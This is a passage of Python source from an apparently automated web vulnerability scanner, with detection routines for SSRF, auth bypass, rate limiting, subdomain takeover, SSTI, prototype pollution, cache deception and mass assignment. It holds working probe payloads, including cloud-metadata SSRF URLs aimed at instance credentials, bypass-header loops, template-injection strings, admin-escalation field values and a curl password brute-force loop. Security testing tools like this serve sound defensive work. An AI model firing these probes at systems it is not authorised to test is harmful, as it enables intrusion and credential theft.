    # ── Pattern A: Classic structural diff (original logic, preserved) ────────
    diff = structural_json_diff(orig_body, mod_body)
    if diff["is_idor_candidate"]:
        sens = diff.get("sensitive_keys_found", [])
        return {
            "vuln_type":   "IDOR — {} Access".format(
                "Sensitive Data" if sens else "Object Enumeration"),
            "severity":    "HIGH",
            "confidence":  90 if sens else 72,
            "description": "Object ID {} → {} returns data. Reason: {}".format(
                orig_id, test_id, diff["reason"]),
            "evidence":    "ID {} → HTTP {} | Sensitive keys: {} | Key match: {}".format(
                test_id, mod_status,
                sens[:3] if sens else "none",
                diff["keys_match"]),
            "sensitive_keys": sens,
        }

    return {}


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 8: SSRF — Expanded with Infrastructure Trust Headers
# ══════════════════════════════════════════════════════════════════════════════
SSRF_PARAMS   = ["url","uri","endpoint","host","server","fetch","load","dest",
                 "redirect","callback","webhook","proxy","path","next","return",
                 "img","image","link","src","feed","download","file","document"]
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/",   # Alibaba Cloud IMDS
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:22",
    "http://0.0.0.0:80",
]
SSRF_METADATA_INDICATORS = [
    "ami-id","instance-id","ec2","metadata","computeMetadata",
    "serviceAccounts","token","iam/security-credentials",
]

def _ssrf_reproduction_steps(url: str, param: str, oob_domain: str) -> list[str]:
    domain = oob_domain or "<generated_oob_domain>"
    return [
        "1. Start interactsh-client: interactsh-client -server oast.fun",
        "2. Use the generated domain as the SSRF payload value",
        "3. Send the request to {} with parameter {}={}".format(url, param, domain),
        "4. Observe DNS/HTTP callback in interactsh output",
        "5. Screenshot the callback as proof",
    ]


def _find_ssrf_oob_callback(oob_url: str) -> dict:
    domain = str(oob_url or "").replace("http://", "").replace("https://", "").rstrip("/")
    if not domain:
        return {}
    for interaction in reversed(getattr(oob, "_interactions", [])):
        raw_request = str(
            interaction.get("raw-request", "")
            or interaction.get("request", "")
        )
        unique_id = str(interaction.get("unique-id", ""))
        if domain in raw_request or domain.split(".")[0] in unique_id:
            return {
                "domain": domain,
                "timestamp": str(interaction.get("timestamp", "")),
                "protocol": str(interaction.get("protocol", "DNS")).upper(),
            }
    return {}


async def hunt_ssrf(client, url):
    results = []
    parsed  = urlparse(url)
    params  = parse_qs(parsed.query)

    for param in list(params.keys())[:10]:
        if param.lower() not in SSRF_PARAMS:
            continue

        payloads_to_test = list(SSRF_PAYLOADS[:2])

        # Inject OOB payload for blind/async SSRF (deferred webhooks, PDF generators, etc.)
        oob_url = oob.get_ssrf_payload(param, url)
        if oob_url:
            payloads_to_test.append(oob_url)

        for payload in payloads_to_test:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = "{}?{}".format(url.split("?")[0], urlencode(test_params))

            for extra_headers in [{}] + INFRA_TRUST_HEADERS[:4]:
                r = await tget(client, test_url,
                               headers={**BASE_HEADERS, **extra_headers},
                               follow_redirects=False)
                if not r: continue
                body = r.text.lower()
                metadata_indicators = [
                    indicator for indicator in (
                        "ami-id", "instance-id", "iam/security-credentials"
                    )
                    if indicator in body
                ]
                if metadata_indicators:
                    results.append(finding(
                        "SSRF — Cloud Metadata Access", "CRITICAL", 94, url, "GET",
                        "Param '{}' fetched cloud metadata endpoint{}.".format(
                            param,
                            " via header {}".format(list(extra_headers.keys())[0]) if extra_headers else ""),
                        "Payload: {} → metadata content returned | Headers: {}".format(
                            payload, extra_headers or "none"),
                        "Validate and whitelist URLs. Block internal IP ranges.",
                        "CWE-918", 9.8,
                        {
                            "ssrf_payload": payload,
                            "ssrf_via_header": bool(extra_headers),
                            "metadata_indicators": metadata_indicators,
                            "exploitability_status": "confirmed",
                            "evidence_strength": "strong",
                            "false_positive_risk": "low",
                            "business_impact": "Confirmed access to cloud instance metadata may expose workload identity and cloud credentials.",
                            "technical_impact": "The server retrieved a cloud metadata response from a link-local metadata service.",
                            "reproduction_steps": _ssrf_reproduction_steps(
                                url, param, oob_url.replace("http://", "") if oob_url else ""
                            ),
                            "redaction_status": "redacted",
                        }
                    ))
                    return results
                elif r.status_code < 400:
                    callback = _find_ssrf_oob_callback(oob_url)
                    callback_confirmed = bool(callback)
                    if not callback_confirmed:
                        # A successful application response only proves that the
                        # parameter was accepted. Blind SSRF is reportable only
                        # after an attributed DNS/HTTP OOB interaction.
                        continue
                    oob_domain = (
                        callback.get("domain", "")
                        or oob_url.replace("http://", "").replace("https://", "").rstrip("/")
                    )
                    evidence = (
                        "?{}={} -> {} | OOB {} callback domain={} timestamp={} | Headers: {}"
                        .format(
                            param,
                            payload,
                            r.status_code,
                            callback.get("protocol", "DNS"),
                            callback.get("domain", ""),
                            callback.get("timestamp", ""),
                            extra_headers or "none",
                        )
                    )
                    note = "SSRF confirmed by an attributed OOB callback."
                    results.append(finding(
                        "SSRF — OOB Confirmed",
                        "CRITICAL",
                        98,
                        url,
                        "GET",
                        "{} Param '{}' accepted an internal/OOB URL with HTTP {}{}.".format(
                            note,
                            param,
                            r.status_code,
                            " via {}".format(list(extra_headers.keys())[0]) if extra_headers else "",
                        ),
                        evidence,
                        "Validate/whitelist URLs. Block private IP ranges.",
                        "CWE-918",
                        9.1,
                        {
                            "ssrf_payload": payload,
                            "ssrf_param": param,
                            "oob_domain": oob_domain,
                            "oob_callback": callback,
                            "exploitability_status": "confirmed",
                            "evidence_strength": "strong",
                            "false_positive_risk": "low",
                            "business_impact": "The server made an attacker-controlled outbound request.",
                            "technical_impact": "An attributed DNS/HTTP callback proves server-side URL retrieval.",
                            "reproduction_steps": _ssrf_reproduction_steps(
                                url, param, oob_domain
                            ),
                            "safe_manual_validation_steps": _ssrf_reproduction_steps(
                                url, param, oob_domain
                            ),
                            "redaction_status": "redacted",
                        },
                    ))
                    return results
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 9: Auth Bypass — Expanded Trust Headers
# ══════════════════════════════════════════════════════════════════════════════
AUTH_PATHS = [
    "/admin","/admin/","/admin/dashboard","/admin/users","/admin/config",
    "/api/admin","/api/v1/admin","/api/v2/admin",
    "/api/users","/api/v1/users","/api/v2/users",
    "/api/config","/api/settings","/api/debug",
    "/management","/console","/cp","/panel","/internal",
    "/actuator","/actuator/env","/actuator/beans",
    "/wp-admin/","/administrator/",
]

async def hunt_auth_bypass(client, base_url):
    results = []
    base    = "{}://{}".format(urlparse(base_url).scheme, urlparse(base_url).netloc)
    sem     = asyncio.Semaphore(8)

    async def check(path):
        async with sem:
            url = base + path
            r_normal = await tget(client, url, follow_redirects=False)
            if not r_normal:
                return

            if r_normal.status_code in (401, 403):
                # Try all expanded infrastructure trust headers
                for bypass_hdr in INFRA_TRUST_HEADERS:
                    r_bypass = await tget(client, url,
                                          headers={**BASE_HEADERS, **bypass_hdr},
                                          follow_redirects=False)
                    if r_bypass and r_bypass.status_code == 200:
                        results.append(finding(
                            "Auth Bypass via {} Header".format(list(bypass_hdr.keys())[0]),
                            "CRITICAL", 87, url, "GET",
                            "Path '{}': {} → 200 using header {}.".format(
                                path, r_normal.status_code, bypass_hdr),
                            "Normal: {} | With {}: 200".format(
                                r_normal.status_code, bypass_hdr),
                            "Validate authorization server-side, ignoring bypass headers.",
                            "CWE-288", 9.1,
                            {"bypass_header": bypass_hdr}
                        ))
                        return

            elif r_normal.status_code == 200:
                content = r_normal.text[:300].lower()
                if any(kw in content for kw in
                       ["dashboard","admin","user","config","setting","management","root"]):
                    results.append(finding(
                        "Unauthenticated Admin Access", "CRITICAL", 88, url, "GET",
                        "Admin endpoint '{}' accessible with no auth.".format(path),
                        "HTTP 200 — {}".format(r_normal.text[:120]),
                        "Require authentication on all admin/management endpoints.",
                        "CWE-306", 9.8
                    ))

    await asyncio.gather(*[check(p) for p in AUTH_PATHS])
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 10: Rate Limiting
# ══════════════════════════════════════════════════════════════════════════════
def _rate_limit_impact(path: str) -> tuple[str, str]:
    lower = path.lower()
    if any(value in lower for value in ("/password/reset", "/forgot")):
        return "Account takeover via password reset enumeration", "HIGH"
    if any(value in lower for value in ("/otp", "/verify", "/2fa")):
        return "2FA bypass via OTP brute force", "HIGH"
    if any(value in lower for value in ("/login", "/auth", "/signin")):
        return "Password brute force possible", "HIGH"
    if any(value in lower for value in ("/payment", "/checkout")):
        return "Payment abuse possible", "HIGH"
    if any(value in lower for value in ("/register", "/signup")):
        return "Account enumeration and spam", "MEDIUM"
    if any(value in lower for value in ("/api/search", "/api/query")):
        return "API abuse / data harvesting", "MEDIUM"
    return "", "MEDIUM"


async def hunt_rate_limiting(client, url):
    parsed = urlparse(url)
    impact_category, severity = _rate_limit_impact(parsed.path)
    if not impact_category:
        return []

    statuses = []
    started = time.monotonic()

    # Stage 1: establish that the first 20 requests are not throttled.
    for _ in range(20):
        if throttle.host_dead:
            return []
        r = await tget(client, url, follow_redirects=False)
        if not r:
            return []
        statuses.append(r.status_code)
        if r.status_code != 200:
            return []

    # Stage 2: confirm complete absence of limiting with 100 more bounded,
    # read-only requests. tget enforces ScopePolicy request caps and Smart Throttle.
    for _ in range(100):
        if throttle.host_dead:
            return []
        r = await tget(client, url, follow_redirects=False)
        if not r:
            return []
        statuses.append(r.status_code)
        if r.status_code != 200:
            return []

    all_succeeded = len(statuses) == 120 and all(status == 200 for status in statuses)
    if not all_succeeded:
        return []

    elapsed = max(0.001, time.monotonic() - started)
    attempts_per_minute = max(1, int(len(statuses) / elapsed * 60))
    escaped_url = url.replace("'", "'\"'\"'")
    poc_script = (
        "for i in $(seq 1 100); do curl -s -o /dev/null "
        "-w '%{{http_code}}\\n' -X POST '{}' "
        "-d 'username=test&password=test'$i; done"
    ).format(escaped_url)
    business_impact = "{} — no lockout or CAPTCHA after 120 requests".format(
        impact_category
    )
    return [finding(
        "No Rate Limiting — 120 Requests Confirmed",
        severity,
        96,
        url,
        "GET",
        "{}. The endpoint returned HTTP 200 for all 120 bounded validation requests.".format(
            business_impact
        ),
        "120/120 read-only requests returned HTTP 200; no 429, lockout, challenge, or blocking response observed.",
        "Implement per-account and per-IP rate limiting, progressive delays, lockout controls, monitoring, and CAPTCHA where appropriate.",
        "CWE-307",
        7.5 if severity == "HIGH" else 6.5,
        {
            "requests_sent": 120,
            "all_succeeded": True,
            "business_impact": business_impact,
            "poc_script": poc_script,
            "exploitation_scenario": "Attacker can enumerate {} passwords per minute without lockout".format(
                attempts_per_minute
            ),
            "rate_limit_proof_method": "read_only_get",
            "exploitability_status": "probable",
            "evidence_strength": "moderate",
            "false_positive_risk": "medium",
            "reproduction_steps": [
                "Send 20 authorized read-only requests to {} and confirm every response is HTTP 200.".format(url),
                "Send 100 additional authorized read-only requests within the configured safety caps.",
                "Confirm all 120 responses remain HTTP 200 with no 429, lockout, CAPTCHA, or challenge.",
                "Use the provided POST PoC only with an approved disposable test account.",
            ],
            "safe_manual_validation_steps": [
                "Use only an approved disposable test account.",
                "Stop immediately if the target returns 403, 429, 503, a challenge page, or a lockout warning.",
                "Do not test real user credentials, payment instruments, or production account creation.",
            ],
            "redaction_status": "not_required",
        },
    )]


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 11: JWT Analysis
# ══════════════════════════════════════════════════════════════════════════════
async def hunt_jwt(client, url):
    results = []
    r = await tget(client, url)
    text = (r.text + " ".join(v for v in r.headers.values())) if r else ""
    if auth_matrix.configured:
        session_a_headers, session_b_headers = auth_matrix.session_headers()
        text += " " + " ".join(
            str(value)
            for headers in (session_a_headers, session_b_headers)
            for value in headers.values()
        )
    for jwt in set(re.findall(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*", text)):
        confirmed = await test_jwt(jwt, url, client)
        results.extend(normalize_finding(item) for item in confirmed)
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 12: GraphQL Introspection
# ══════════════════════════════════════════════════════════════════════════════
GQL_QUERY = '{"query":"{__schema{types{name fields{name}}}}"}'
GQL_PATHS = ["/graphql","/api/graphql","/v1/graphql","/graphiql","/graph","/gql"]

async def hunt_graphql(client, base_url):
    results = []
    base    = "{}://{}".format(urlparse(base_url).scheme, urlparse(base_url).netloc)
    for path in GQL_PATHS:
        url = base + path
        r   = await tpost(client, url, content=GQL_QUERY,
                          headers={**BASE_HEADERS,"Content-Type":"application/json"})
        if r and r.status_code == 200 and "__schema" in r.text:
            results.append(finding("GraphQL Introspection Enabled","MEDIUM",95,url,"POST",
                "Full schema exposed via introspection.",
                "POST {} → __schema data returned".format(path),
                "Disable introspection in production. Apply query depth/complexity limits.",
                "CWE-200",5.3))
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 13: Subdomain Takeover
# ══════════════════════════════════════════════════════════════════════════════
TAKEOVER_FINGERPRINTS = {
    "There isn't a GitHub Pages site here":   "GitHub Pages",
    "NoSuchBucket":                            "AWS S3",
    "The specified bucket does not exist":     "AWS S3",
    "This domain is not configured":           "Fastly",
    "Fastly error: unknown domain":            "Fastly",
    "No settings were found for this company": "HubSpot",
    "This shop is currently unavailable":      "Shopify",
    "Heroku | No such app":                    "Heroku",
    "project not found":                       "Netlify",
    "Unrecognized domain":                     "Cargo",
    "UserVoice subdomain is currently available": "UserVoice",
    "is not a registered InCloud YouTrack":    "YouTrack",
    "It looks like you may have taken a wrong turn": "Tumblr",
    "Acquia Cloud":                            "Acquia",
    "This page is reserved for":               "Ghost",
}


async def _resolve_cname(hostname):
    """Resolve a CNAME without adding a third-party DNS dependency."""
    try:
        process = await asyncio.create_subprocess_exec(
            "nslookup",
            "-type=CNAME",
            hostname,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        stdout, _ = await asyncio.wait_for(process.communicate(), timeout=6)
        text = stdout.decode("utf-8", errors="ignore")
        patterns = (
            r"(?im)canonical name\s*=\s*([^\s]+)",
            r"(?im)\bname\s*=\s*([^\s]+)",
            r"(?im)\baliases:\s*([^\s]+)",
        )
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                target = match.group(1).strip().rstrip(".").lower()
                if target and target != hostname.lower():
                    return target
    except Exception:
        pass

    # AI_CANONNAME is less precise than an explicit CNAME lookup but provides
    # a useful fallback on systems without nslookup.
    try:
        records = await asyncio.to_thread(
            socket.getaddrinfo,
            hostname,
            None,
            0,
            0,
            0,
            socket.AI_CANONNAME,
        )
        for record in records:
            canonical = str(record[3] or "").strip().rstrip(".").lower()
            if canonical and canonical != hostname.lower():
                return canonical
    except Exception:
        pass
    return ""


async def _provider_request(client, method, url):
    """
    Read-only validation against a strict provider allowlist.
    Never follows redirects and never attempts account/resource creation.
    """
    hostname = (urlparse(url).hostname or "").lower()
    allowed_hosts = (
        hostname == "github.com"
        or hostname == "app.netlify.com"
        or hostname == "s3.amazonaws.com"
        or hostname.endswith(".s3.amazonaws.com")
        or hostname.endswith(".s3-website.amazonaws.com")
        or hostname.endswith(".s3-website-us-east-1.amazonaws.com")
        or hostname.endswith(".netlify.app")
        or hostname.endswith(".github.io")
    )
    if not allowed_hosts:
        return None
    try:
        return await client.request(
            method,
            url,
            timeout=REQUEST_TIMEOUT.get(),
            follow_redirects=False,
            headers={**BASE_HEADERS, "Accept": "*/*"},
        )
    except httpx.HTTPError:
        return None


def _s3_bucket_name(hostname, cname_target):
    for candidate in (cname_target, hostname):
        lower = (candidate or "").lower().rstrip(".")
        match = re.match(
            r"^([a-z0-9][a-z0-9.-]{1,61}[a-z0-9])\."
            r"s3(?:[.-]website(?:[.-][a-z0-9-]+)?|[.-][a-z0-9-]+)?"
            r"\.amazonaws\.com$",
            lower,
        )
        if match:
            return match.group(1)
    return ""


async def _prove_github_pages(client, hostname, cname_target):
    target = cname_target if cname_target.endswith(".github.io") else ""
    if not target:
        return None, "GitHub Pages fingerprint found, but no github.io CNAME was resolved."
    owner = target.split(".", 1)[0]
    repository = "{}.github.io".format(owner)
    repo_url = "https://github.com/{}/{}".format(owner, repository)
    response = await _provider_request(client, "HEAD", repo_url)
    if response and response.status_code == 404:
        return True, "HEAD {} returned 404 — target repository is absent.".format(repo_url)
    if response:
        return False, "HEAD {} returned HTTP {} — repository absence not confirmed.".format(
            repo_url, response.status_code
        )
    return None, "Could not validate GitHub Pages repository ownership."


async def _prove_s3(client, hostname, cname_target):
    bucket = _s3_bucket_name(hostname, cname_target)
    if not bucket:
        return None, "AWS S3 fingerprint found, but the bucket name could not be derived."
    bucket_url = "https://s3.amazonaws.com/{}".format(bucket)
    head = await _provider_request(client, "HEAD", bucket_url)
    get_response = None
    if head and head.status_code == 404:
        get_response = await _provider_request(client, "GET", bucket_url)
    body = get_response.text[:1000] if get_response else ""
    error_code = (
        (head.headers.get("x-amz-error-code", "") if head else "")
        or ("NoSuchBucket" if "NoSuchBucket" in body else "")
    )
    if head and head.status_code == 404 and error_code == "NoSuchBucket":
        return True, (
            "HEAD {} returned 404 and provider response reported NoSuchBucket — "
            "bucket is unclaimed."
        ).format(bucket_url)
    if head:
        if head.status_code == 404:
            return None, "HEAD {} returned 404 without NoSuchBucket proof.".format(
                bucket_url
            )
        return False, "HEAD {} returned HTTP {}{}.".format(
            bucket_url,
            head.status_code,
            "",
        )
    return None, "Could not validate the derived AWS S3 bucket."


async def _prove_netlify(client, cname_target):
    target = cname_target if cname_target.endswith(".netlify.app") else ""
    if not target:
        return None, "Netlify fingerprint found, but no netlify.app CNAME was resolved."
    site_name = target.split(".", 1)[0]
    dashboard_url = "https://app.netlify.com/sites/{}".format(site_name)
    response = await _provider_request(client, "HEAD", dashboard_url)
    if response and response.status_code == 404:
        return True, "HEAD {} returned 404 — Netlify site target is unclaimed.".format(
            dashboard_url
        )
    if response:
        return False, "HEAD {} returned HTTP {} — unclaimed state not confirmed.".format(
            dashboard_url, response.status_code
        )
    return None, "Could not validate the Netlify site target."


async def _takeover_proof(client, hostname, service, cname_target):
    if service == "GitHub Pages":
        return await _prove_github_pages(client, hostname, cname_target)
    if service == "AWS S3":
        return await _prove_s3(client, hostname, cname_target)
    if service == "Netlify":
        return await _prove_netlify(client, cname_target)
    return None, (
        "{} fingerprint detected; automated provider-specific ownership "
        "validation is not implemented."
    ).format(service)


async def hunt_subdomain_takeover(client, url):
    r = await tget(client, url)
    if not r: return []
    for fp, service in TAKEOVER_FINGERPRINTS.items():
        if fp.lower() in r.text.lower():
            hostname = (urlparse(url).hostname or "").lower()
            cname_target = await _resolve_cname(hostname)
            unclaimed_status, proof = await _takeover_proof(
                client, hostname, service, cname_target
            )
            confirmed_unclaimed = unclaimed_status is True
            takeover_possible = unclaimed_status is not False
            exploitability = "confirmed" if confirmed_unclaimed else "probable"
            target_reference = cname_target or hostname
            exploit_description = (
                "Register or claim the unassigned provider resource referenced by "
                "{} to serve arbitrary content on {}."
            ).format(target_reference, hostname)
            impact = (
                "Phishing, cookie theft, and stored XSS delivery on {}."
            ).format(hostname)
            proof_evidence = {
                "takeover_possible": takeover_possible,
                "service": service,
                "cname_target": cname_target,
                "proof": proof,
                "exploit_description": exploit_description,
                "impact": impact,
                "severity": "HIGH",
                "exploitability_status": exploitability,
            }
            return [finding(
                "Subdomain Takeover — {}".format(service),
                "HIGH",
                97 if confirmed_unclaimed else 82,
                url,
                "GET",
                (
                    "Provider-specific validation confirmed an unclaimed {} "
                    "resource."
                ).format(service) if confirmed_unclaimed else (
                    "{} takeover fingerprint detected; claimability requires "
                    "authorized manual validation."
                ).format(service),
                json.dumps(proof_evidence, ensure_ascii=False),
                "Remove the stale DNS record or bind it to a provider resource controlled by the organization.",
                "CWE-350",
                8.1,
                {
                    **proof_evidence,
                    "takeover_proof": proof_evidence,
                    "fingerprint": fp,
                    "exploitability_status": exploitability,
                    "evidence_strength": "strong" if confirmed_unclaimed else "moderate",
                    "false_positive_risk": "low" if confirmed_unclaimed else "medium",
                    "business_impact": impact,
                    "technical_impact": exploit_description,
                    "safe_manual_validation_steps": [
                        "Confirm the DNS CNAME and provider response from an authorized environment.",
                        "Do not register or claim the external resource without written authorization.",
                        "Remove or correct the stale DNS record immediately if ownership is no longer required.",
                    ],
                    "redaction_status": "not_required",
                },
            )]
    return []


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 14: Parameter Mining — Target-Specific Param Dictionary
# ══════════════════════════════════════════════════════════════════════════════
INTERESTING_PARAM_PATTERNS = [
    "debug","preview","test","admin","internal","beta","dev",
    "api_key","token","secret","key","auth","bypass","disable",
    "format","output","callback","redirect","next","return",
    "file","path","template","view","page","action","cmd",
    "version","v","ver","export","download","import",
]

async def hunt_parameter_mining(client, urls: list[str], live_hosts: list[dict]) -> list[dict]:
    """
    Parse all URLs to find rare/interesting params used on one endpoint.
    Fuzz ALL other endpoints with those params to find hidden authorization bypasses.
    """
    results      = []
    param_freq   = Counter()
    param_to_url = defaultdict(list)

    # Build frequency map
    for url in urls:
        for param in parse_qs(urlparse(url).query).keys():
            param_freq[param.lower()] += 1
            param_to_url[param.lower()].append(url)

    # Rare params (appear < 4 times) AND match interesting pattern
    rare_params = {
        p for p, count in param_freq.items()
        if count < 4 and any(kw in p for kw in INTERESTING_PARAM_PATTERNS)
    }

    if not rare_params:
        return []

    # Get base URLs to fuzz
    base_urls = list({
        "{}://{}{}".format(urlparse(h["url"]).scheme,
                           urlparse(h["url"]).netloc,
                           urlparse(h["url"]).path)
        for h in live_hosts[:15]
    })

    sem = asyncio.Semaphore(6)

    async def fuzz_param(base, param):
        async with sem:
            for value in ["true","1","../","admin","test","debug"]:
                test_url = "{}?{}={}".format(base, param, value)
                r = await tget(client, test_url)
                if not r: continue
                # Flag if different from clean response
                r_clean = await tget(client, base)
                if not r_clean: continue
                if (r.status_code != r_clean.status_code or
                        (r.status_code == 200 and
                         abs(len(r.text) - len(r_clean.text)) > 200)):
                    results.append(finding(
                        "Hidden Parameter Behavior — ?{}={}".format(param, value),
                        "MEDIUM", 70, test_url, "GET",
                        "Rare param '{}' causes different response when set to '{}'.".format(param, value),
                        "Clean: {} ({} bytes) | With param: {} ({} bytes)".format(
                            r_clean.status_code, len(r_clean.text),
                            r.status_code, len(r.text)),
                        "Investigate '{}' parameter. May expose debug mode or auth bypass.".format(param),
                        "CWE-285", 6.5
                    ))
                    return   # one finding per param per base

    tasks = [fuzz_param(base, param) for base in base_urls[:10] for param in list(rare_params)[:8]]
    await asyncio.gather(*tasks)
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 15: Web Cache Deception
# ══════════════════════════════════════════════════════════════════════════════
SENSITIVE_ENDPOINT_PATTERNS = [
    "/profile", "/account", "/user", "/dashboard",
    "/settings", "/me", "/myaccount", "/orders",
    "/billing", "/payment", "/wallet", "/admin",
]
STATIC_EXTENSIONS   = [".css", ".js", ".jpg", ".png", ".gif", ".woff", ".ico"]
CACHE_INDICATORS    = ["hit", "miss", "age", "x-cache", "cf-cache-status",
                       "x-varnish", "via"]
SENSITIVE_PATTERNS  = [
    r'"email"\s*:', r'"phone"\s*:', r'"address"\s*:',
    r'"credit_card"\s*:', r'"ssn"\s*:', r'"balance"\s*:',
    r'"account_number"\s*:', r'"api_key"\s*:',
]

async def hunt_cache_deception(client, urls: list[str], live_hosts: list[dict]) -> list[dict]:
    """
    Test if sensitive endpoints are cached when accessed with static-looking paths.
    Web cache deception: /profile → cached; /profile.css → also cached with profile data.
    """
    results    = []
    base_urls  = {
        "{}://{}".format(urlparse(h["url"]).scheme, urlparse(h["url"]).netloc)
        for h in live_hosts[:10]
    }
    sem = asyncio.Semaphore(6)

    async def test_endpoint(base, endpoint, ext):
        async with sem:
            test_url = base + endpoint + ext
            # Request 1 — prime the cache
            r1 = await tget(client, test_url, headers={
                **BASE_HEADERS, "Cache-Control": "no-cache"
            })
            if not r1 or r1.status_code not in (200, 304):
                return

            # Request 2 — check if it's now cached
            r2 = await tget(client, test_url, headers={**BASE_HEADERS})
            if not r2: return

            resp_headers_lower = {k.lower(): v.lower() for k, v in r2.headers.items()}

            # Check cache indicators
            cache_hit = any(
                ind in resp_headers_lower and "hit" in resp_headers_lower.get(ind,"")
                for ind in CACHE_INDICATORS
            )
            # Check if sensitive data in response
            has_sensitive = any(re.search(p, r2.text) for p in SENSITIVE_PATTERNS)

            if has_sensitive and (cache_hit or "age" in resp_headers_lower):
                age_val = resp_headers_lower.get("age","0")
                results.append(finding(
                    "Web Cache Deception — {}{}".format(endpoint, ext),
                    "HIGH", 80,
                    test_url, "GET",
                    "Sensitive endpoint cached with static extension '{}'. "
                    "Cache age: {}. Private data served from cache.".format(ext, age_val),
                    "Cache-Control: {} | Age: {} | Sensitive data pattern found".format(
                        resp_headers_lower.get("cache-control","none"), age_val),
                    "Configure cache to never cache authenticated/private endpoints. "
                    "Use Cache-Control: no-store, private on sensitive responses.",
                    "CWE-524", 7.5,
                    {"cache_age": age_val, "static_ext": ext}
                ))

    tasks = [
        test_endpoint(base, endpoint, ext)
        for base in base_urls
        for endpoint in SENSITIVE_ENDPOINT_PATTERNS
        for ext in STATIC_EXTENSIONS[:4]
    ]
    await asyncio.gather(*tasks)
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  ADVANCED CLASSES: bounded checks and high-signal candidates
# ══════════════════════════════════════════════════════════════════════════════

POLLUTION_PARAMS = [
    "__proto__[polluted]", "constructor[prototype][polluted]", "__proto__.polluted"
]
TEMPLATE_PARAMS = {"template", "view", "page", "name", "message", "email", "q", "search"}
OAUTH_HINTS = ("oauth", "authorize", "redirect_uri", "client_id", "response_type", "scope")
UPLOAD_HINTS = ("upload", "file", "avatar", "import", "attachment", "media")
RACE_HINTS = ("checkout", "coupon", "redeem", "transfer", "withdraw", "payment", "order", "wallet")


def _body_delta(a, b) -> int:
    if not a or not b:
        return 0
    return abs(len(a.text or "") - len(b.text or ""))


async def hunt_prototype_pollution(client, url):
    parsed = urlparse(url)
    base = url.split("?")[0]
    params = parse_qs(parsed.query)
    if not params and not any(k in parsed.path.lower() for k in ("config", "settings", "json", "api")):
        return []
    clean = await tget(client, url)
    if not clean:
        return []
    for pp in POLLUTION_PARAMS:
        test_url = "{}?{}=burpollama".format(base, pp)
        r = await tget(client, test_url)
        if not r:
            continue
        reflected = "burpollama" in (r.text or "").lower()
        changed = r.status_code >= 500 or _body_delta(clean, r) > 500
        if reflected or changed:
            return [finding(
                "Prototype Pollution Candidate", "HIGH" if r.status_code >= 500 else "MEDIUM",
                68, test_url, "GET",
                "Prototype-style parameter changed server response; verify whether object merge reaches server-side logic.",
                "param={} | clean={}({}b) polluted={}({}b) reflected={}".format(
                    pp, clean.status_code, len(clean.text), r.status_code, len(r.text), reflected),
                "Use safe object merge utilities. Reject __proto__/constructor/prototype keys recursively.",
                "CWE-1321", 7.1,
                {"advanced_class": "prototype_pollution", "needs_manual_verification": True}
            )]
    return []


async def hunt_ssti(client, url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return []
    for param in list(params.keys())[:4]:
        if param.lower() not in TEMPLATE_PARAMS:
            continue
        for payload in ("{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>"):
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = "{}?{}".format(url.split("?")[0], urlencode(test_params))
            r = await tget(client, test_url)
            if not r:
                continue
            if "49" in r.text and payload not in r.text:
                return [finding(
                    "Server-Side Template Injection", "CRITICAL", 86, url, "GET",
                    "Template expression appears to be evaluated server-side in parameter '{}'.".format(param),
                    "Payload {} produced evaluated marker 49 without reflecting raw payload.".format(payload),
                    "Never render user input as a template. Use strict context-aware escaping and sandboxed templates.",
                    "CWE-94", 9.1,
                    {"advanced_class": "ssti", "param": param}
                )]

        differential = await blind_diff_test(
            client,
            url,
            param,
            "{{7*7}}",
            "{{7*'7'}}",
        )
        if differential.get("oracle_detected"):
            return [finding(
                "Server-Side Template Injection Candidate",
                "HIGH",
                differential.get("confidence", 72),
                url,
                "GET",
                "Template expressions produced a stable {} in parameter '{}'.".format(
                    differential.get("oracle_type", "response oracle"),
                    param,
                ),
                json.dumps(differential, ensure_ascii=False),
                "Never render user input as a template. Use strict allowlisted variables and sandboxed template environments.",
                "CWE-94",
                7.5,
                {
                    "advanced_class": "ssti",
                    "param": param,
                    "ssti_payloads": ["{{7*7}}", "{{7*'7'}}"],
                    "blind_diff": differential,
                    "exploitability_status": "needs_manual_validation",
                    "evidence_strength": "moderate",
                    "false_positive_risk": "medium",
                    "business_impact": "A confirmed template evaluation flaw could expose server data or lead to server-side code execution.",
                    "reproduction_steps": [
                        "Send {{7*7}} three times and record response size and JSON structure.",
                        "Send {{7*'7'}} three times using the same session and headers.",
                        "Confirm the reported differential remains stable and is caused by template evaluation.",
                    ],
                    "redaction_status": "not_required",
                },
            )]
    return []


# ══════════════════════════════════════════════════════════════════════════════
#  CLASS 20: Confirmed Mass Assignment Testing
# ══════════════════════════════════════════════════════════════════════════════
MASS_ASSIGNMENT_PAYLOADS = {
    "isAdmin": True,
    "is_admin": True,
    "role": "admin",
    "admin": True,
    "privilege": "admin",
    "verified": True,
    "email_verified": True,
    "account_type": "admin",
    "subscription": "enterprise",
    "credits": 999999,
    "balance": 999999,
    "permissions": ["admin"],
}
HIGH_IMPACT_ASSIGNMENT_FIELDS = {"role", "isAdmin", "is_admin", "admin", "privilege"}
MASS_ASSIGNMENT_SUCCESS = {200, 201, 202, 204}


def _json_object(response):
    if not response:
        return None
    try:
        payload = response.json()
    except ValueError:
        return None
    if isinstance(payload, dict):
        for wrapper in ("data", "result", "resource", "user", "account", "profile"):
            if isinstance(payload.get(wrapper), dict):
                return payload[wrapper]
        return payload
    return None


def _json_field_names(value, prefix=""):
    names = set()
    if isinstance(value, dict):
